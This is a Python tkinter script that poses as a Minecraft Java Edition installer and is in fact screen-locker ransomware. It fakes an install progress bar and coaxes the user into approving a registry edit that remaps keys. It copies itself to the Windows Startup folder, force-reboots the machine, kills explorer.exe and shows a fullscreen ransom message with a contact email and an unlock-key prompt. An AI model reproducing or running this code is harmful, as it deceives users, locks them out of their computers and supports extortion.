import tkinter as t
import tkinter.font as tf
import tkinter.messagebox as tm
import tkinter.ttk as tk
import os
import time
import getpass
import shutil
global i
global key
user = getpass.getuser()
path = "C:/Users/Public/mc.py"
sp = "C:/Users/"+user+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/v3.py"
shutil.copyfile(path,sp)
def ok():
    global key
    global i
    inp = i.get()
    if inp=="python":
        v.destroy()
        key.destroy()
        os.system("explorer.exe")
        CAD_block = open("C:/Users/Public/change.reg",'w')
        CAD_block.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]\n\"Scancode Map\"=-")
        CAD_block.close()
        os.system("C:/Users/Public/change.reg")
        os.remove(sp)
        tm.showinfo("복구 완료","복구된 내용을 적용하기 위해 자동으로 재부팅 됩니다")
        
def k():
    global key
    global i
    key = t.Tk()
    key.title("해독 키")
    key.geometry("500x200")
    key.attributes("-topmost", True)
    text = t.Label(key,text="전달받은 해독 키를 입력하세요",font=('Gulim',20)).place(x=70,y=20)
    i = t.Entry(key,width=50)
    i.place(x=80,y=120)
    b = t.Button(key,text="입력",command=ok).place(x=250,y=160)
try:
    c = open("C:/Users/Public/check.txt",'r')
    c.close()
    os.system("taskkill /IM explorer.exe /f")
    v = t.Tk()
    e = t.Button(v,text="해독 키 입력",command = k).place(x=0,y=0)
    message = t.Label(v,text="당신의 컴퓨터는 이제 제것입니다.\n \"나가기\"버튼을 얻고 싶다면 표시된 이메일로 연락하세요.",fg="red",font=('Gulim',40)).place(x=50,y=50)
    m2 = t.Label(v,text="ywyu0812@gmail.com",fg="green",font=('Gulim',40)).place(x=500,y=180)
    v.attributes("-fullscreen", True)
    v.attributes("-topmost", True)
    v.mainloop()
except:
    c = open("C:/Users/Public/check.txt",'w')
    fake = t.Tk()
    fake.title("Minecraft : Java Edition Installer")
    fake.geometry("1000x500")
    text = t.Label(fake,text="Minecraft : Java Edition을 사용자의 컴퓨터에 설치하는 중입니다.\n",font=('Gulim',20)).place(x=100,y=20)
    text = t.Label(fake,text="100% 정품\n100% 안전\n100% 합법",fg="green",font=('Gulim',40)).place(x=370,y=70)
    load = t.DoubleVar()
    loading = tk.Progressbar(fake,max=100,length=900,variable=load)
    loading.place(x=50,y=320)
    for l in range(1,31):
        load.set(l)
        loading.update()
        time.sleep(0.05)
    time.sleep(1)
    for l in range(32,78):
        load.set(l)
        loading.update()
        time.sleep(0.05)
    time.sleep(2)
    for l in range(79,101):
        load.set(l)
        loading.update()
        time.sleep(0.1)
    fake.destroy()
    tm.showinfo("설치 성공","게임을 실행하려면 레지스트리 등록이 필요합니다.\n관리자 확인 메시지가 표시되면 '예'를 클릭해주세요.")
    CAD_block = open("C:/Users/Public/change.reg",'w')
    c.write("ok")
    c.close()
    CAD_block.write("Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]\n\"Scancode Map\"=hex:00,00,00,00,00,00,00,00,03,00,00,00,38,00,5B,E0,5B,E0,38,00,00,00,00,00")
    CAD_block.close()
    os.system("C:/Users/Public/change.reg")
    os.system("shutdown -r -f -t 0")
